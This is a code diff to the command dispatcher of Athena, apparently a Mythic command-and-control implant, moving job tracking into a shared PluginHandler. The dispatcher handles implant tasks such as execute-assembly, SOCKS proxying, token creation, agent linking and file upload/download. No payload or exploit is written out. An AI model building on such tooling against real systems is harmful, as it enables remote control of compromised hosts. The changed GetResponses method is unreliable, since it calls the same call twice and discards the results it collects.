@@ -10,6 +10,7 @@ using System.Text;
 using Athena.Plugins;
 using Athena.Models.Config;
 using System.Text.Json;
+using Athena.Models;
 
 namespace Athena.Commands
 {
@@ -31,7 +32,6 @@ namespace Athena.Commands
         public event EventHandler<TaskEventArgs> StopSocks;
         public delegate void ExitRequestedHandler(object sender, TaskEventArgs e);
         public event EventHandler<TaskEventArgs> ExitRequested;
-        private ConcurrentDictionary<string, MythicJob> activeJobs { get; set; }
         private AssemblyHandler assemblyHandler { get; }
         private DownloadHandler downloadHandler { get; }
         private UploadHandler uploadHandler { get; }
@@ -41,7 +41,7 @@ namespace Athena.Commands
         private ConcurrentBag<string> responseResults { get; set; }
         public CommandHandler()
         {
-            this.activeJobs = new ConcurrentDictionary<string, MythicJob>();
+            //PluginHandler.activeJobs = new ConcurrentDictionary<string, MythicJob>();
             this.assemblyHandler = new AssemblyHandler();
             this.downloadHandler = new DownloadHandler();
             this.uploadHandler = new UploadHandler();
@@ -58,8 +58,8 @@ namespace Athena.Commands
         /// <param name="task">MythicTask object containing the parameters of the task</param>
         public async Task StartJob(MythicTask task)
         {
-            MythicJob job = activeJobs.GetOrAdd(task.id, new MythicJob(task));
-            job.started = true;
+            MythicJob job = PluginHandler.activeJobs.GetOrAdd(task.id, new MythicJob(task));
+            job.started = true; 
 #if WINBUILD
             if(task.token != 0)
             {
@@ -86,19 +86,19 @@ namespace Athena.Commands
                     break;
                 case "C6E6495DF88816EAC7376920027393A4": //execute-assembly
                     this.responseResults.Add(await assemblyHandler.ExecuteAssembly(job));
-                    this.activeJobs.Remove(task.id, out _);
+                    PluginHandler.activeJobs.Remove(task.id, out _);
                     break;
                 case "F24F62EEB789199B9B2E467DF3B1876B": //Exit
                     RequestExit(job);
                     break;
                 case "27A06A9E3D5E7F67EB604A39536208C9": //jobs
                     this.responseResults.Add(await this.GetJobs(task.id));
-                    this.activeJobs.Remove(task.id, out _);
+                    PluginHandler.activeJobs.Remove(task.id, out _);
                     break;
                 case "363AFEF7C118EEDBD908495180280BB7": //jobkill
-                    if (this.activeJobs.ContainsKey(task.parameters))
+                    if (PluginHandler.activeJobs.ContainsKey(task.parameters))
                     {
-                        this.activeJobs[task.parameters].cancellationtokensource.Cancel();
+                        PluginHandler.activeJobs[task.parameters].cancellationtokensource.Cancel();
                         this.responseResults.Add(new ResponseResult
                         {
                             user_output = "Cancelled job",
@@ -116,32 +116,32 @@ namespace Athena.Commands
                             status = "error"
                         }.ToJson());
                     }
-                    this.activeJobs.Remove(task.id, out _);
+                    PluginHandler.activeJobs.Remove(task.id, out _);
                     break;
                 case "2A304A1348456CCD2234CD71A81BD338": //link
                     StartInternalForwarder(job); //I could maybe make this a loadable plugin? it may require some changes to how delegates are passed
-                    this.activeJobs.Remove(task.id, out _);
+                    PluginHandler.activeJobs.Remove(task.id, out _);
                     break;
                 case "1CDEDE1665F21542BDE8DD9F3C4E362E": //list-profiles
                     this.responseResults.Add(await this.ListProfiles(job));
-                    this.activeJobs.Remove(task.id, out _);
+                    PluginHandler.activeJobs.Remove(task.id, out _);
                     //test
                     break;
                 case "EC4D1EB36B22D19728E9D1D23CA84D1C": //load
                     this.responseResults.Add(await assemblyHandler.LoadCommandAsync(job));
-                    this.activeJobs.Remove(task.id, out _);
+                    PluginHandler.activeJobs.Remove(task.id, out _);
                     break;
                 case "790C1BE487AC4162A26A760E50AE619A": //load-assembly
                     this.responseResults.Add(await assemblyHandler.LoadAssemblyAsync(job)); //I bet I could make this a plugin by using the current app context
-                    this.activeJobs.Remove(task.id, out _);
+                    PluginHandler.activeJobs.Remove(task.id, out _);
                     break;
                 case "E659634F6A18B0CACD0AB3C3A95845A7": //reset-assembly-context
                     this.responseResults.Add(await assemblyHandler.ClearAssemblyLoadContext(job));
-                    this.activeJobs.Remove(task.id, out _);
+                    PluginHandler.activeJobs.Remove(task.id, out _);
                     break;
                 case "C9FAB33E9458412C527C3FE8A13EE37D": //sleep
                     UpdateSleepAndJitter(job);
-                    this.activeJobs.Remove(task.id, out _);
+                    PluginHandler.activeJobs.Remove(task.id, out _);
                     break;
                 case "3E5A1B3B990187C9FB8E8156CE25C243": //socks
                     //var socksInfo = JsonSerializer.Deserialize<Dictionary<string, object>>(job.task.parameters);
@@ -155,7 +155,7 @@ namespace Athena.Commands
                     {
                         StopSocksProxy(job);
                     }
-                    this.activeJobs.Remove(task.id, out _);
+                    PluginHandler.activeJobs.Remove(task.id, out _);
                     break;
                 case "5D343B8042C5EE2EA7C892C5ECC16E30": //stop-assembly
                     this.responseResults.Add(new ResponseResult
@@ -164,11 +164,11 @@ namespace Athena.Commands
                         completed = "true",
                         task_id = job.task.id,
                     }.ToJson());
-                    this.activeJobs.Remove(task.id, out _);
+                    PluginHandler.activeJobs.Remove(task.id, out _);
                     break;
                 case "E9B43EE9A9B0FDF6EF393DC0591C11DB": //set-profile
                     SwitchProfile(job);
-                    this.activeJobs.Remove(task.id, out _);
+                    PluginHandler.activeJobs.Remove(task.id, out _);
                     break;
 
 
@@ -185,16 +185,16 @@ namespace Athena.Commands
                         this.responseResults.Add(await this.tokenHandler.CreateToken(job));
                     }
 
-                    this.activeJobs.Remove(task.id, out _);
+                    PluginHandler.activeJobs.Remove(task.id, out _);
                     break;
 #endif
                 case "695630CFC5EB92580FB3E76A0C790E63": //unlink
                     StopInternalForwarder(job);
-                    this.activeJobs.Remove(task.id, out _); //plugin-able if we move link there
+                    PluginHandler.activeJobs.Remove(task.id, out _); //plugin-able if we move link there
                     break;
                 case "F972C1D6198BAF47DD8FD9A05832DB0F": //unload
                     this.responseResults.Add(await assemblyHandler.UnloadCommands(job));
-                    this.activeJobs.Remove(task.id, out _);
+                    PluginHandler.activeJobs.Remove(task.id, out _);
                     break;
                 case "76EE3DE97A1B8B903319B7C013D8C877": //upload
                     if(!await downloadHandler.ContainsJob(job.task.id))
@@ -208,7 +208,7 @@ namespace Athena.Commands
                     if(rr is not null)
                     {
                         this.responseResults.Add(rr.ToJson());
-                        this.activeJobs.Remove(task.id, out _);
+                        PluginHandler.activeJobs.Remove(task.id, out _);
 
                     }
 
@@ -347,28 +347,11 @@ namespace Athena.Commands
             {
                 responses.Add(await this.assemblyHandler.GetAssemblyOutput());
             }
-            List<object> results = await PluginHandler.GetResponses();
 
-            foreach(ResponseResult response in results)
-            {
-                if (response is FileBrowserResponseResult fbresult)
-                {
-                    responses.Add(fbresult.ToJson());
-                }
-                else if (response is ProcessResponseResult presult)
-                {
-                    responses.Add(presult.ToJson());
-                }
-                else
-                {
-                    responses.Add(((ResponseResult)response).ToJson());
-                }
+            List<string> results = await PluginHandler.GetResponses();
 
-                if (this.activeJobs.ContainsKey(response.task_id) && response.completed ==  "true")
-                {
-                    this.activeJobs.Remove(response.task_id, out _);
-                }
-            }
+            results.AddRange(await PluginHandler.GetResponses());
+
             return responses;
         }
         /// <summary>
@@ -397,7 +380,7 @@ namespace Athena.Commands
         {
             //List<object> jobs = new List<object>();
             List<JobStatus> jobsStatus = new List<JobStatus>();
-            foreach(var j in this.activeJobs)
+            foreach(var j in PluginHandler.activeJobs)
             {
                 jobsStatus.Add(j.Value.GetStatus()); 
             }
@@ -439,7 +422,7 @@ namespace Athena.Commands
             MythicUploadJob uploadJob = await this.uploadHandler.GetUploadJob(response.task_id);
             if (uploadJob.cancellationtokensource.IsCancellationRequested)
             {
-                this.activeJobs.Remove(response.task_id, out _);
+                PluginHandler.activeJobs.Remove(response.task_id, out _);
                 await this.uploadHandler.CompleteUploadJob(response.task_id);
             }
 
@@ -454,7 +437,7 @@ namespace Athena.Commands
                 if (response.chunk_num == uploadJob.total_chunks)
                 {
                     await this.uploadHandler.CompleteUploadJob(response.task_id);
-                    this.activeJobs.Remove(response.task_id, out _);
+                    PluginHandler.activeJobs.Remove(response.task_id, out _);
                     this.responseResults.Add(new UploadResponse
                     {
                         task_id=response.task_id,
@@ -505,14 +488,14 @@ namespace Athena.Commands
             MythicDownloadJob downloadJob = await this.downloadHandler.GetDownloadJob(response.task_id);
             if (downloadJob.cancellationtokensource.IsCancellationRequested)
             {
-                this.activeJobs.Remove(response.task_id, out _);
+                PluginHandler.activeJobs.Remove(response.task_id, out _);
                 await this.uploadHandler.CompleteUploadJob(response.task_id);
             }
 
             if (string.IsNullOrEmpty(downloadJob.file_id) && string.IsNullOrEmpty(response.file_id))
             {
                 await this.downloadHandler.CompleteDownloadJob(response.task_id);
-                this.activeJobs.Remove(response.task_id, out _);
+                PluginHandler.activeJobs.Remove(response.task_id, out _);
                 this.responseResults.Add(new DownloadResponse
                 {
                     task_id = response.task_id,
@@ -549,7 +532,7 @@ namespace Athena.Commands
                     else
                     {
                         await this.downloadHandler.CompleteDownloadJob(response.task_id);
-                        this.activeJobs.Remove(response.task_id, out _);
+                        PluginHandler.activeJobs.Remove(response.task_id, out _);
                         this.responseResults.Add(new DownloadResponse
                         {
                             task_id = response.task_id,
